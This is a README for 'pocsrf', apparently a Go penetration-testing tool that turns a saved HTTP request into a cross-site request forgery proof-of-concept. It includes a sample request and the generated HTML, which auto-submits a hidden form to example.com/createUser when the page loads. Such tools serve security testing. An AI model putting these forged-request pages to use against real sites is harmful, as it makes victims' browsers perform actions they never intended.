# pocsrf
Yet another csrf generator.

# Installation
```bash
$ git clone https://github.com/lateralusd/pocsrf.git && cd ./pocsrf
$ go install ./...
$ ~/go/bin/pocsrf -help
Usage of pocsrf:
  -i string
    	input filename (default "req")
  -o string
    	output filename (default "out_csrf.html")
  -s	use http or https (default http)
```

# Usage
You can use it as a standalone binary, or as a library.

## Standalone binary
First you need to have request saved in a file, like the one below.

```http
$ cat req
POST /createUser HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:88.0) Gecko/20100101 Firefox/88.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: http://example.com
Connection: close

create=user&username=testUsername
```

If you are working with https, you need to pass `-s` flag.

```bash
$ pocsrf -i req -o output_csrf.html -s
$ cat output_csrf.html
<html>
        <body>
                <form action="https://example.com/createUser" method="POST">

                <input type="hidden" name="create" value="user"/> 
                <input type="hidden" name="username" value="testUsername"/> 

                </form>
                <script>
                        document.forms[0].submit();
                </script>
        </body>
</html>
```

# Note
The way the data is extracted now from the file is a bad way and will probably need to update it.
